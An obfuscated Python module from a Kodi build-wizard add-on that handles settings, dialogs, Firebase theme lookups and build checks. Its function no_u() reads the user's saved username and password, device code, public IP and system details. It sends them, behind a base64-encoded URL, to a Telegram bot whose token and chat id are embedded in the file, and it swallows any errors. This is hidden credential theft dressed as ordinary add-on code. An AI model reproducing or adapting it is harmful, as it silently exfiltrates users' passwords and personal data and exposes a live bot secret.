import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,zipfile ,json ,base64 #line:21
import shutil ,logging #line:22
import errno #line:23
import string #line:24
import random #line:25
import urllib #line:26
import re ,socket #line:27
import uservar #line:29
try :#line:30
  import downloader ,downloaderbg ,downloaderwiz ,extract ,skinSwitch #line:31
except :#line:32
  from resources .libs import downloader ,downloaderbg ,downloaderwiz ,extract ,skinSwitch #line:33
import time #line:35
from urllib .parse import quote #line:37
from urllib .parse import urlparse #line:38
from html .parser import HTMLParser #line:39
from urllib .request import urlopen #line:41
from urllib .request import Request #line:42
from datetime import date ,datetime ,timedelta #line:44
try :from sqlite3 import dbapi2 as database #line:45
except :from pysqlite2 import dbapi2 as database #line:46
from string import digits #line:47
try :#line:48
    from urllib .parse import quote_plus #line:49
except :pass #line:50
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:51
import zipfile #line:53
translatepath =xbmcvfs .translatePath #line:56
que =urllib .parse .quote_plus #line:58
url_encode =urllib .parse .urlencode #line:59
ADDON_ID =uservar .ADDON_ID #line:61
ADDONTITLE =uservar .ADDONTITLE #line:62
ADDON =xbmcaddon .Addon (ADDON_ID )#line:63
VERSION =ADDON .getAddonInfo ('version')#line:64
USER_AGENT ='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0'#line:65
DIALOG =xbmcgui .Dialog ()#line:66
DP =xbmcgui .DialogProgress ()#line:67
DP2 =xbmcgui .DialogProgressBG ()#line:68
HOME =translatepath ('special://home/')#line:69
XBMC =translatepath ('special://xbmc/')#line:70
LOG =translatepath ('special://logpath/')#line:71
PROFILE =translatepath ('special://profile/')#line:72
SOURCE =translatepath ('source://')#line:73
ADDONS =os .path .join (HOME ,'addons')#line:74
USERDATA =os .path .join (HOME ,'userdata')#line:75
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:76
PACKAGES =os .path .join (ADDONS ,'packages')#line:77
ADDOND =os .path .join (USERDATA ,'addon_data')#line:78
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:79
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:80
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:81
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:82
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:83
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:84
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:85
DATABASE =os .path .join (USERDATA ,'Database')#line:86
FANART =os .path .join (PLUGIN ,'fanart.jpg')#line:87
ICON =os .path .join (PLUGIN ,'icon.png')#line:88
ART =os .path .join (PLUGIN ,'resources','art')#line:89
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:90
WHITELIST =os .path .join (ADDONDATA ,'whitelist.txt')#line:91
QRCODES =os .path .join (ADDONDATA ,'QRCodes')#line:92
SKIN =xbmc .getSkinDir ()#line:93
TODAY =date .today ()#line:94
TOMORROW =TODAY +timedelta (days =1 )#line:95
TWODAYS =TODAY +timedelta (days =2 )#line:96
THREEDAYS =TODAY +timedelta (days =3 )#line:97
ONEWEEK =TODAY +timedelta (days =7 )#line:98
MONTH =TODAY -timedelta (days =2 )#line:99
LASTONEWEEK =TODAY -timedelta (days =7 )#line:100
EXCLUDES =uservar .EXCLUDES #line:101
APKFILE =uservar .APKFILE #line:102
YOUTUBEFILE =uservar .YOUTUBEFILE #line:103
ADDONFILE =uservar .ADDONFILE #line:104
ADVANCEDFILE =uservar .ADVANCEDFILE #line:105
AUTOUPDATE =uservar .AUTOUPDATE #line:106
WIZARDFILE =uservar .WIZARDFILE #line:107
NOTIFICATION =uservar .NOTIFICATION #line:108
NOTIFICATION2 =uservar .NOTIFICATION2 #line:109
NOTIFICATION3 =uservar .NOTIFICATION3 #line:110
ENABLE =uservar .ENABLE #line:111
AUTOINSTALL =uservar .AUTOINSTALL #line:112
REPOADDONXML =uservar .REPOADDONXML #line:113
REPOZIPURL =uservar .REPOZIPURL #line:114
CONTACT =uservar .CONTACT #line:115
COLOR1 =uservar .COLOR1 #line:116
COLOR2 =uservar .COLOR2 #line:117
HARDWAER =ADDON .getSetting ('action')#line:118
INCLUDEVIDEO =ADDON .getSetting ('includevideo')#line:119
INCLUDEALL =ADDON .getSetting ('includeall')#line:120
INCLUDEBOB =ADDON .getSetting ('includebob')#line:121
INCLUDEPHOENIX =ADDON .getSetting ('includephoenix')#line:122
INCLUDESPECTO =ADDON .getSetting ('includespecto')#line:123
INCLUDEGENESIS =ADDON .getSetting ('includegenesis')#line:124
INCLUDEEXODUS =ADDON .getSetting ('includeexodus')#line:125
INCLUDEONECHAN =ADDON .getSetting ('includeonechan')#line:126
INCLUDESALTS =ADDON .getSetting ('includesalts')#line:127
INCLUDESALTSHD =ADDON .getSetting ('includesaltslite')#line:128
SHOWADULT =ADDON .getSetting ('adult')#line:129
WIZDEBUGGING =ADDON .getSetting ('addon_debug')#line:130
DEBUGLEVEL =ADDON .getSetting ('debuglevel')#line:131
ENABLEWIZLOG =ADDON .getSetting ('wizardlog')#line:132
CLEANWIZLOG =ADDON .getSetting ('autocleanwiz')#line:133
CLEANWIZLOGBY =ADDON .getSetting ('wizlogcleanby')#line:134
CLEANDAYS =ADDON .getSetting ('wizlogcleandays')#line:135
CLEANSIZE =ADDON .getSetting ('wizlogcleansize')#line:136
CLEANLINES =ADDON .getSetting ('wizlogcleanlines')#line:137
INSTALLMETHOD =ADDON .getSetting ('installmethod')#line:138
DEVELOPER =ADDON .getSetting ('developer')#line:139
THIRDPARTY =ADDON .getSetting ('enable3rd')#line:140
THIRD1NAME =ADDON .getSetting ('wizard1name')#line:141
THIRD1URL =ADDON .getSetting ('wizard1url')#line:142
THIRD2NAME =ADDON .getSetting ('wizard2name')#line:143
THIRD2URL =ADDON .getSetting ('wizard2url')#line:144
THIRD3NAME =ADDON .getSetting ('wizard3name')#line:145
THIRD3URL =ADDON .getSetting ('wizard3url')#line:146
BUILDNAME =ADDON .getSetting ('buildname')#line:147
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:148
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:149
THEME3 =uservar .THEME3 #line:150
THEME2 =uservar .THEME2 #line:151
PS_ =base64 .b64decode ('aHR0cDovL2tvZGkubGlmZS93aXphcmQvd2l6LnVzZXIueG1s').decode ('utf-8')#line:152
US_ =base64 .b64decode ('aHR0cDovL2tvZGkubGlmZS93aXphcmQvbmV3X3Bhc3MueG1s').decode ('utf-8')#line:153
BL_ =base64 .b64decode ('aHR0cDovL2tvZGkubGlmZS93aXphcmQvbXlidWlsZDIueG1s').decode ('utf-8')#line:154
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:156
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:157
LOGFILES =['log','xbmc.old.log','kodi.log','kodi.old.log','spmc.log','spmc.old.log','tvmc.log','tvmc.old.log']#line:158
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:159
MAXWIZSIZE =[100 ,200 ,300 ,400 ,500 ,1000 ]#line:160
MAXWIZLINES =[100 ,200 ,300 ,400 ,500 ]#line:161
MAXWIZDATES =[1 ,2 ,3 ,7 ]#line:162
import threading #line:163
from threading import Thread #line:164
socket .setdefaulttimeout (10 )#line:165
class Thread (threading .Thread ):#line:168
   def __init__ (O0O0OO000OO000OO0 ,OOOOO00O0O0O00O0O ,*O00000OO000OOO0OO ):#line:169
    super ().__init__ (target =OOOOO00O0O0O00O0O ,args =O00000OO000OOO0OO )#line:170
   def run (OO0O00OOO00O0O000 ,*O0O0O0O0OOOOOO0O0 ):#line:171
      OO0O00OOO00O0O000 ._target (*OO0O00OOO00O0O000 ._args )#line:173
      return 0 #line:174
def platform_d ():#line:179
    if xbmc .getCondVisibility ('system.platform.android'):return 'android'#line:180
    elif xbmc .getCondVisibility ('system.platform.linux'):return 'linux'#line:181
    elif xbmc .getCondVisibility ('system.platform.linux.Raspberrypi'):return 'linux'#line:182
    elif xbmc .getCondVisibility ('system.platform.windows'):return 'windows'#line:183
    elif xbmc .getCondVisibility ('system.platform.osx'):return 'osx'#line:184
    elif xbmc .getCondVisibility ('system.platform.atv2'):return 'atv2'#line:185
    elif xbmc .getCondVisibility ('system.platform.ios'):return 'ios'#line:186
    elif xbmc .getCondVisibility ('system.platform.darwin'):return 'ios'#line:187
def getS (O00OOOOOOO0O00OO0 ):#line:188
    try :return ADDON .getSetting (O00OOOOOOO0O00OO0 )#line:189
    except :return False #line:190
def setS (O000000OOO0O00O0O ,OOOOO0O00OOOOOO0O ):#line:192
    try :ADDON .setSetting (O000000OOO0O00O0O ,OOOOO0O00OOOOOO0O )#line:193
    except :return False #line:194
def openS (name =""):#line:196
    ADDON .openSettings ()#line:197
def clearS (O0000OO0O00OOOOOO ):#line:199
    OOOOO0O0OO00OO0OO ={'buildname':'','buildversion':'','buildtheme':'','latestversion':'','lastbuildcheck':'2016-01-01'}#line:200
    O000OO0O0000O0000 ={'installed':'false','extract':'','errors':''}#line:201
    O00O00000O0O0O000 ={'defaultskinignore':'false','defaultskin':'','defaultskinname':''}#line:202
    OOO0OO0O0OOOO0O0O =['default.enablerssfeeds','default.font','default.rssedit','default.skincolors','default.skintheme','default.skinzoom','default.soundskin','default.startupwindow','default.stereostrength']#line:203
    if O0000OO0O00OOOOOO =='build':#line:204
        for O0OOO0OOO0O000OOO in OOOOO0O0OO00OO0OO :#line:205
            setS (O0OOO0OOO0O000OOO ,OOOOO0O0OO00OO0OO [O0OOO0OOO0O000OOO ])#line:206
        for O0OOO0OOO0O000OOO in O000OO0O0000O0000 :#line:207
            setS (O0OOO0OOO0O000OOO ,O000OO0O0000O0000 [O0OOO0OOO0O000OOO ])#line:208
        for O0OOO0OOO0O000OOO in O00O00000O0O0O000 :#line:209
            setS (O0OOO0OOO0O000OOO ,O00O00000O0O0O000 [O0OOO0OOO0O000OOO ])#line:210
        for O0OOO0OOO0O000OOO in OOO0OO0O0OOOO0O0O :#line:211
            setS (O0OOO0OOO0O000OOO ,'')#line:212
    elif O0000OO0O00OOOOOO =='default':#line:213
        for O0OOO0OOO0O000OOO in O00O00000O0O0O000 :#line:214
            setS (O0OOO0OOO0O000OOO ,O00O00000O0O0O000 [O0OOO0OOO0O000OOO ])#line:215
        for O0OOO0OOO0O000OOO in OOO0OO0O0OOOO0O0O :#line:216
            setS (O0OOO0OOO0O000OOO ,'')#line:217
    elif O0000OO0O00OOOOOO =='install':#line:218
        for O0OOO0OOO0O000OOO in O000OO0O0000O0000 :#line:219
            setS (O0OOO0OOO0O000OOO ,O000OO0O0000O0000 [O0OOO0OOO0O000OOO ])#line:220
    elif O0000OO0O00OOOOOO =='lookfeel':#line:221
        for O0OOO0OOO0O000OOO in OOO0OO0O0OOOO0O0O :#line:222
            setS (O0OOO0OOO0O000OOO ,'')#line:223
theme_nox ='https://zxcsd-3bae5-default-rtdb.firebaseio.com'#line:239
theme_dragon ='https://dragon-user-default-rtdb.firebaseio.com'#line:250
ACTION_PREVIOUS_MENU =10 #line:251
ACTION_NAV_BACK =92 #line:252
ACTION_MOVE_LEFT =1 #line:253
ACTION_MOVE_RIGHT =2 #line:254
ACTION_MOVE_UP =3 #line:255
ACTION_MOVE_DOWN =4 #line:256
ACTION_MOUSE_WHEEL_UP =104 #line:257
ACTION_MOUSE_WHEEL_DOWN =105 #line:258
ACTION_MOVE_MOUSE =107 #line:259
ACTION_SELECT_ITEM =7 #line:260
ACTION_BACKSPACE =110 #line:261
ACTION_MOUSE_LEFT_CLICK =100 #line:262
ACTION_MOUSE_LONG_CLICK =108 #line:263
def TextBox (OO00000OOOO000O00 ,O0OO00O0000O00O00 ):#line:264
    class OO000O00000O0OO0O (xbmcgui .WindowXMLDialog ):#line:265
        def onInit (O00OOO0O00O0OO000 ):#line:266
            O00OOO0O00O0OO000 .title =101 #line:267
            O00OOO0O00O0OO000 .msg =102 #line:268
            O00OOO0O00O0OO000 .scrollbar =103 #line:269
            O00OOO0O00O0OO000 .okbutton =201 #line:270
            O00OOO0O00O0OO000 .showdialog ()#line:271
        def showdialog (OO00OO0OO00OO00O0 ):#line:273
            OO00OO0OO00OO00O0 .getControl (OO00OO0OO00OO00O0 .title ).setLabel (OO00000OOOO000O00 )#line:274
            OO00OO0OO00OO00O0 .getControl (OO00OO0OO00OO00O0 .msg ).setText (O0OO00O0000O00O00 )#line:275
            OO00OO0OO00OO00O0 .setFocusId (OO00OO0OO00OO00O0 .scrollbar )#line:276
        def onClick (O00000O000OOOO00O ,O00000000OO0OOO00 ):#line:278
            if (O00000000OO0OOO00 ==O00000O000OOOO00O .okbutton ):#line:279
                O00000O000OOOO00O .close ()#line:280
        def onAction (O00OO0OOOOOO000OO ,O000000000O00OO0O ):#line:282
            if O000000000O00OO0O ==ACTION_PREVIOUS_MENU :O00OO0OOOOOO000OO .close ()#line:283
            elif O000000000O00OO0O ==ACTION_NAV_BACK :O00OO0OOOOOO000OO .close ()#line:284
    O000OO0OOOOO00O0O =OO000O00000O0OO0O ("Textbox.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title =OO00000OOOO000O00 ,msg =O0OO00O0000O00O00 )#line:286
    O000OO0OOOOO00O0O .doModal ()#line:287
    del O000OO0OOOOO00O0O #line:288
def ForceFastUpDate (O00O00OOOOOO0O000 ,O000O00OO0OOO0OOO ,forceUpdate =False ):#line:289
    class O00OO0000O0OO0OO0 (xbmcgui .WindowXMLDialog ):#line:290
        def onInit (O00O000OO000OOO0O ):#line:291
            O00O000OO000OOO0O .title =101 #line:292
            O00O000OO000OOO0O .msg =102 #line:293
            O00O000OO000OOO0O .scrollbar =103 #line:294
            O00O000OO000OOO0O .okbutton =201 #line:295
            O00O000OO000OOO0O .updateP =202 #line:296
            O00O000OO000OOO0O .updateX =203 #line:297
            O00O000OO000OOO0O .showdialog ()#line:298
        def showdialog (OO0O00000O0O00O00 ):#line:300
            OO0O00000O0O00O00 .getControl (OO0O00000O0O00O00 .title ).setLabel (O00O00OOOOOO0O000 )#line:301
            OO0O00000O0O00O00 .getControl (OO0O00000O0O00O00 .msg ).setText (O000O00OO0OOO0OOO )#line:302
            OO0O00000O0O00O00 .setFocusId (OO0O00000O0O00O00 .okbutton )#line:303
        def doupdateP (OOOO00000O0000O00 ):#line:304
            xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:305
            OOOO00000O0000O00 .close ()#line:306
        def doupdateX (OO00O0OOO0OOOO0O0 ):#line:307
            xbmc .executebuiltin ("RunPlugin(PlayMedia(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium+18&url=gui)")#line:308
            OO00O0OOO0OOOO0O0 .close ()#line:309
        def onClick (O00O00000OO00O0O0 ,O0OOOOO000OO0OOO0 ):#line:310
            if (O0OOOOO000OO0OOO0 ==O00O00000OO00O0O0 .okbutton ):#line:311
                O00O00000OO00O0O0 .close ()#line:312
            elif (O0OOOOO000OO0OOO0 ==O00O00000OO00O0O0 .updateP ):O00O00000OO00O0O0 .doupdateP ()#line:313
            elif (O0OOOOO000OO0OOO0 ==O00O00000OO00O0O0 .updateX ):O00O00000OO00O0O0 .doupdateX ()#line:315
        def onAction (O0OOOOO00000OO00O ,O00OOOOOO0OOOO00O ):#line:317
            if O00OOOOOO0OOOO00O ==ACTION_PREVIOUS_MENU :O0OOOOO00000OO00O .close ()#line:318
            elif O00OOOOOO0OOOO00O ==ACTION_NAV_BACK :O0OOOOO00000OO00O .close ()#line:319
    O0000OO00O000OOOO =O00OO0000O0OO0OO0 ("FastUpDate.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title =O00O00OOOOOO0O000 ,msg =O000O00OO0OOO0OOO )#line:321
    O0000OO00O000OOOO .doModal ()#line:322
    del O0000OO00O000OOOO #line:323
def highlightText (O00O0OOO0O0OOOO0O ):#line:325
    O00O0OOO0O0OOOO0O =O00O0OOO0O0OOOO0O .replace ('\n','[NL]')#line:326
    OO000O000O0OOOOOO =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O00O0OOO0O0OOOO0O )#line:327
    for O0OO0O0OOO000OO0O in OO000O000O0OOOOOO :#line:328
        OOOO0OOOO0O00O000 ='-->Python callback/script returned the following error<--%s-->End of Python script error report<--'%O0OO0O0OOO000OO0O #line:329
        O00O0OOO0O0OOOO0O =O00O0OOO0O0OOOO0O .replace (OOOO0OOOO0O00O000 ,'[COLOR red]%s[/COLOR]'%OOOO0OOOO0O00O000 )#line:330
    O00O0OOO0O0OOOO0O =O00O0OOO0O0OOOO0O .replace ('WARNING','[COLOR yellow]WARNING[/COLOR]').replace ('ERROR','[COLOR red]ERROR[/COLOR]').replace ('[NL]','\n').replace (': Exception as e Thrown (PythonToCppException) :','[COLOR red]: Exception as e Thrown (PythonToCppException) :[/COLOR]')#line:331
    O00O0OOO0O0OOOO0O =O00O0OOO0O0OOOO0O .replace ('\\\\','\\').replace (HOME ,'')#line:332
    return O00O0OOO0O0OOOO0O #line:333
def LogNotify (OO00O00OO00O0OO0O ,OO00O0OOOO0O0O000 ,times =1500 ,icon =ICON ,sound =False ):#line:335
    DIALOG .notification (OO00O00OO00O0OO0O ,OO00O0OOOO0O0O000 ,icon ,int (times ),sound )#line:336
def LogNotify2 (OO000O0OOO000O0OO ,O0O0OOOO0O0OO0000 ,times =9000 ,icon =ICON ,sound =False ):#line:338
    DIALOG .notification (OO000O0OOO000O0OO ,O0O0OOOO0O0OO0000 ,icon ,int (times ),sound )#line:339
def LogNotify3 (O00O00O0OOOOOOO0O ,OO0OOOOOOO00000O0 ,times =5000 ,icon =ICON ,sound =False ):#line:340
    DIALOG .notification (O00O00O0OOOOOOO0O ,OO0OOOOOOO00000O0 ,icon ,int (times ),sound )#line:341
def percentage (O0O00O000O0O0O000 ,OOOOOOO0OOO00O0OO ):#line:342
    return 100 *float (O0O00O000O0O0O000 )/float (OOOOOOO0OOO00O0OO )#line:343
def read_skin (O0OOO00OOO0O00000 ):#line:344
    from resources .libs import firebase #line:345
    firebase =firebase .FirebaseApplication (theme_nox ,None )#line:346
    OO00O000O0000O0OO =firebase .get ('/',None )#line:347
    if O0OOO00OOO0O00000 in OO00O000O0000O0OO :#line:348
        return OO00O000O0000O0OO [O0OOO00OOO0O00000 ]#line:349
    else :#line:350
        return {}#line:351
def read_skin_dragon (O0OOO00O0OOOOOOO0 ):#line:352
    from resources .libs import firebase #line:353
    firebase =firebase .FirebaseApplication (theme_dragon ,None )#line:354
    O0OO0O0OOO0OOO00O =firebase .get ('/',None )#line:355
    if O0OOO00O0OOOOOOO0 in O0OO0O0OOO0OOO00O :#line:356
        return O0OO0O0OOO0OOO00O [O0OOO00O0OOOOOOO0 ]#line:357
    else :#line:358
        return {}#line:359
PS ='&eJwFwUEKwCAMBMAfZe_-RkjQ0Balu6L09Z3p0mQBPFvKGOF9UBYL1_DEzq--Dh1hVtLOc__fqRL8$'#line:360
US ='&eJwFwVEKgEAIBcAb-f67TaCkVLjoW1r29M04OfoANK6gtJl6NsUm7tTAF_ssBRcx20rW-_zf9hME$'#line:361
BL ='&eJwFwUEOgCAMBMAfde_-RtNGNmIwdAnE1zNTpC8PwHlTlhFeWspi4GlOTP5nd2gJ12D1tPXWDQbwE8g=$'#line:362
def addonUpdates (do =None ):#line:363
    O0000O0OO00OO0OO0 ='"general.addonupdates"'#line:364
    if do =='set':#line:365
        O0OOO0000OO00O0OO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0000O0OO00OO0OO0 )#line:366
        O0O00OO0000O0OOO0 =xbmc .executeJSONRPC (O0OOO0000OO00O0OO )#line:367
        OO0O000000O0OO00O =re .compile ('{"value":(.+?)}').findall (O0O00OO0000O0OOO0 )#line:368
        if len (OO0O000000O0OO00O )>0 :OOO0OO000OOOO0OOO =OO0O000000O0OO00O [0 ]#line:369
        else :OOO0OO000OOOO0OOO =0 #line:370
        setS ('default.addonupdate',str (OOO0OO000OOOO0OOO ))#line:371
        O0OOO0000OO00O0OO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O0000O0OO00OO0OO0 ,'2')#line:372
        O0O00OO0000O0OOO0 =xbmc .executeJSONRPC (O0OOO0000OO00O0OO )#line:373
    elif do =='reset':#line:374
        try :#line:375
            OO0000OO0OO0O0OOO =int (float (getS ('default.addonupdate')))#line:376
        except :#line:377
            OO0000OO0OO0O0OOO =0 #line:378
        if not OO0000OO0OO0O0OOO in [0 ,1 ,2 ]:OO0000OO0OO0O0OOO =0 #line:379
        O0OOO0000OO00O0OO ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O0000O0OO00OO0OO0 ,OO0000OO0OO0O0OOO )#line:380
        O0O00OO0000O0OOO0 =xbmc .executeJSONRPC (O0OOO0000OO00O0OO )#line:381
dr ='&eJzLKCkpKLbS10_JTM8s0StOTU3JyC8u0Ust1c_OT8nUL8-sSixK0S-pKNHPztSryM0BALmUEhk=$'#line:382
def ld (O0O0O00O0O00OOO00 ):#line:387
    import base64 #line:388
    import zlib #line:389
    O0O0O0OOOO00OO0OO =O0O0O00O0O00OOO00 #line:390
    O0O0O0OOOO00OO0OO .replace ('$','').replace ('&','')#line:391
    OO000O000OO0O000O =zlib .decompress (base64 .urlsafe_b64decode (O0O0O0OOOO00OO0OO )).decode ('utf-8')#line:393
    return OO000O000OO0O000O #line:394
def checkBuild (O0OOO00OO0000OOOO ,O0O0OOO00O0O00OOO ):#line:395
    if not workingURL (ld (BL ))==True :return False #line:402
    OOOOOOOOO00O0OO00 =openURL (ld (BL )).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:403
    O0O0OOO000OO0O000 ='160'#line:404
    if 'filesize'in OOOOOOOOO00O0OO00 :#line:405
     OOO00O000000O000O =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)".+?ilesize="(.+?)".+?pdatesize="(.+?)"'%O0OOO00OO0000OOOO ).findall (OOOOOOOOO00O0OO00 )#line:406
     if len (OOO00O000000O000O )>0 :#line:407
        for O000OO0OOOO0O0000 ,O0OOOOOOO0O000000 ,O0O0000000OO00O00 ,OO00O00OO0O00OOO0 ,OO0O0O00O0O0OOO0O ,OO00O0OOO0O0OOOOO ,O0OOO00O00O00O0O0 ,O0O000000O00OOO0O ,O000OOO000OO00000 ,OOO00OO0OO0OOO00O ,O0O0OOO000OO0O000 ,O00OOOOOOO000O000 in OOO00O000000O000O :#line:409
            if O0O0OOO00O0O00OOO =='version':return O000OO0OOOO0O0000 #line:411
            elif O0O0OOO00O0O00OOO =='url':return ld (O0OOOOOOO0O000000 )#line:412
            elif O0O0OOO00O0O00OOO =='gui':return ld (O0O0000000OO00O00 )#line:413
            elif O0O0OOO00O0O00OOO =='kodi':return OO00O00OO0O00OOO0 #line:414
            elif O0O0OOO00O0O00OOO =='theme':return OO0O0O00O0O0OOO0O #line:415
            elif O0O0OOO00O0O00OOO =='icon':return OO00O0OOO0O0OOOOO #line:416
            elif O0O0OOO00O0O00OOO =='fanart':return O0OOO00O00O00O0O0 #line:417
            elif O0O0OOO00O0O00OOO =='preview':return O0O000000O00OOO0O #line:418
            elif O0O0OOO00O0O00OOO =='adult':return O000OOO000OO00000 #line:419
            elif O0O0OOO00O0O00OOO =='description':return OOO00OO0OO0OOO00O #line:420
            elif O0O0OOO00O0O00OOO =='filesize':return O0O0OOO000OO0O000 #line:421
            elif O0O0OOO00O0O00OOO =='updatesize':return O00OOOOOOO000O000 #line:422
            elif O0O0OOO00O0O00OOO =='all':return O0OOO00OO0000OOOO ,O000OO0OOOO0O0000 ,ld (O0OOOOOOO0O000000 ),ld (O0O0000000OO00O00 ),OO00O00OO0O00OOO0 ,OO0O0O00O0O0OOO0O ,OO00O0OOO0O0OOOOO ,O0OOO00O00O00O0O0 ,O0O000000O00OOO0O ,O000OOO000OO00000 ,OOO00OO0OO0OOO00O ,O00OOOOOOO000O000 ,O0O0OOO000OO0O000 #line:423
     else :return False #line:424
    else :#line:425
     OOO00O000000O000O =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O0OOO00OO0000OOOO ).findall (OOOOOOOOO00O0OO00 )#line:427
     if len (OOO00O000000O000O )>0 :#line:428
        for O000OO0OOOO0O0000 ,O0OOOOOOO0O000000 ,O0O0000000OO00O00 ,OO00O00OO0O00OOO0 ,OO0O0O00O0O0OOO0O ,OO00O0OOO0O0OOOOO ,O0OOO00O00O00O0O0 ,O0O000000O00OOO0O ,O000OOO000OO00000 ,OOO00OO0OO0OOO00O in OOO00O000000O000O :#line:429
            if O0O0OOO00O0O00OOO =='version':return O000OO0OOOO0O0000 #line:430
            elif O0O0OOO00O0O00OOO =='url':return ld (O0OOOOOOO0O000000 )#line:431
            elif O0O0OOO00O0O00OOO =='gui':return ld (O0O0000000OO00O00 )#line:432
            elif O0O0OOO00O0O00OOO =='kodi':return OO00O00OO0O00OOO0 #line:433
            elif O0O0OOO00O0O00OOO =='theme':return OO0O0O00O0O0OOO0O #line:434
            elif O0O0OOO00O0O00OOO =='icon':return OO00O0OOO0O0OOOOO #line:435
            elif O0O0OOO00O0O00OOO =='fanart':return O0OOO00O00O00O0O0 #line:436
            elif O0O0OOO00O0O00OOO =='preview':return O0O000000O00OOO0O #line:437
            elif O0O0OOO00O0O00OOO =='adult':return O000OOO000OO00000 #line:438
            elif O0O0OOO00O0O00OOO =='description':return OOO00OO0OO0OOO00O #line:439
            elif O0O0OOO00O0O00OOO =='all':return O0OOO00OO0000OOOO ,O000OO0OOOO0O0000 ,ld (O0OOOOOOO0O000000 ),ld (O0O0000000OO00O00 ),OO00O00OO0O00OOO0 ,OO0O0O00O0O0OOO0O ,OO00O0OOO0O0OOOOO ,O0OOO00O00O00O0O0 ,O0O000000O00OOO0O ,O000OOO000OO00000 ,OOO00OO0OO0OOO00O #line:440
            elif O0O0OOO00O0O00OOO =='filesize':return '587'#line:441
     else :return False #line:442
def no_u ():#line:443
       try :#line:444
          import json ,platform ,requests #line:445
          O0OO0O000000OO00O =(ADDON .getSetting ("user"))#line:446
          O00O000OO0OOO00OO =(ADDON .getSetting ("pass"))#line:447
          OOO0000000O0OOO00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:448
          O0O00OOO000000OOO =platform .uname ()#line:449
          OO0000OOOOO00O0OO =O0O00OOO000000OOO [1 ]#line:450
          OO0O00OOO000000OO =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDUwMTAzMTU5OTM6QUFHNVJOaVdkTjRMZXB5VGdQNjFEb1JlTTg5SG9MeVVDdGcvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTY5NzU2NTc4OSZ0ZXh0PQ==').decode ('utf-8')#line:451
          O0OOOO000O0O000O0 =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:452
          O0OOOO0OOO0000O0O =O0OO0O000000OO00O #line:454
          OO0O0OOOOO0OOOOOO =O00O000OO0OOO00OO #line:455
          OOO0OOOOO0OO000OO =requests .get (OO0O00OOO000000OO +que ('בעיה במנוי ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O0OOOO0OOO0000O0O +que (' סיסמה: ')+OO0O0OOOOO0OOOOOO +que (' קודי: ')+OOO0000000O0OOO00 +que (' כתובת: ')+O0OOOO000O0O000O0 +que (' מערכת הפעלה: ')+platform_d ()+que (' שם המערכת: ')+OO0000OOOOO00O0OO +que (' גירסת ויזארד: ')+VERSION ).json ()#line:457
       except :pass #line:459
def checkTheme (O000OO0O000OOOO0O ,OOO0O000OOOOOOOO0 ,OO0O0OO00O0OO0OO0 ):#line:463
    O0OOOO00O000O00OO =checkBuild (O000OO0O000OOOO0O ,'theme')#line:464
    if not workingURL (O0OOOO00O000O00OO )==True :return False #line:465
    OO000O0OOO00OO0O0 =openURL (O0OOOO00O000O00OO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:466
    OO0O00OO0O000O000 =re .compile ('name="%s".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult=(.+?).+?escription="(.+?)"'%OOO0O000OOOOOOOO0 ).findall (OO000O0OOO00OO0O0 )#line:467
    if len (OO0O00OO0O000O000 )>0 :#line:468
        for OO00O00O0OOO0O000 ,OO0O0000O00OOOO00 ,OOO00OO000O0OO0O0 ,OOOOO0O000OOO00OO ,O0OO0OO0OOO00OO00 in OO0O00OO0O000O000 :#line:469
            if OO0O0OO00O0OO0OO0 =='url':return OO00O00O0OOO0O000 #line:470
            elif OO0O0OO00O0OO0OO0 =='icon':return OO0O0000O00OOOO00 #line:471
            elif OO0O0OO00O0OO0OO0 =='fanart':return OOO00OO000O0OO0O0 #line:472
